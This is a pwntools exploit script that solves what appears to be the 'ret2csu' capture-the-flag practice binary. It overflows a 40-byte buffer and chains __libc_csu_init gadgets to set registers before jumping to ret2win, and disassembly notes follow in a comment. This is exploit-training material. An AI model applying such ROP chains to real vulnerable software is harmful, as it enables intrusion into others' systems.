from pwn import *

r = process('./ret2csu')
e = ELF('./ret2csu')
#gdb.attach(r)

rop = ''
rop += p64(0x000000000040089a)#pop rbx rbp r12 r13 r14 r15 ret;
rop += p64(0x0) # rbx
rop += p64(0x1) # rbp
#rop += p64(0x00000000004008b4) # r12 fini() pointer
rop += p64(0x00600e48)# r12 fini() pointer
rop += p64(0x1) # r13
rop += p64(0x1) # r14
rop += p64(0xdeadcafebabebeef)#r15

rop += p64(0x0000000000400880) #mov rdx, r15 mov rsi, r14 mov edi r13d
#cae en los pop de nuevo
rop += p64(0x0)#llenar
rop += p64(0x0)#rbx
rop += p64(0x0)#rbp
rop += p64(0x0)#r12
rop += p64(0x0)#r13
rop += p64(0x0)#r14
rop += p64(0x0)#r15
rop += p64(0x004007b1) #ret2win

payload = ''
payload += "A" * 40
payload += rop

r.sendlineafter('> ', payload)
r.interactive()

'''
0x00000000004007b1 ret2win address

sym.ret2win ( rdi,  rsi, rdx);

#0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]

0x000000000040089a <+90>:    pop    rbx
0x000000000040089b <+91>:    pop    rbp
0x000000000040089c <+92>:    pop    r12
0x000000000040089e <+94>:    pop    r13
0x00000000004008a0 <+96>:    pop    r14
0x00000000004008a2 <+98>:    pop    r15
0x00000000004008a4 <+100>:   ret    

0x0000000000400880 <+64>:    mov    rdx,r15
0x0000000000400883 <+67>:    mov    rsi,r14
0x0000000000400886 <+70>:    mov    edi,r13d
0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]

'''